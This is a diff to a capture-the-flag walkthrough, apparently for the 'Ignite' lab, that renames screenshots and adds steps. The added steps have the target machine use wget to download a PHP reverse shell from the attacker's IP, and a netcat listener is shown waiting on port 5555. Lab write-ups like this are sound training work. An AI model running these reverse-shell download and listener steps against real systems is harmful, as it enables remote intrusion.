@@ -217,7 +217,7 @@ Ensure Attacker IP is in the reverse shell:
 Use TMUX and split the screen to make working on both machines simpler.  
 
 `:> tmux` then `ctrl + b` then `"`  
-![TMUX Horizontal Split](assets/ignite-30.png)  
+![TMUX Horizontal Split](assets/ignite-30a.png)  
 
 Start a simple server in one pane.  
 
@@ -227,6 +227,17 @@ Start a netcat listener in the other pane, using the port in the reverse shell.
 
 `:> nc -lvnp 5555`  
 
-![reverse shell setup](assets/ignite-31.png)  
+![reverse shell setup](assets/ignite-31a.png)  
+
+From the target device, use wget to download the reverse shell from the attacking device   
+
+`:> wget -O myRevShell.php 10.6.15.233:8000/prs.php`  
+
+![Download](assets/ignite-32.png)  
+
+and observe the download from the attacking device  
+
+![Download Server](assets/ignite-33.png)
+
 
 
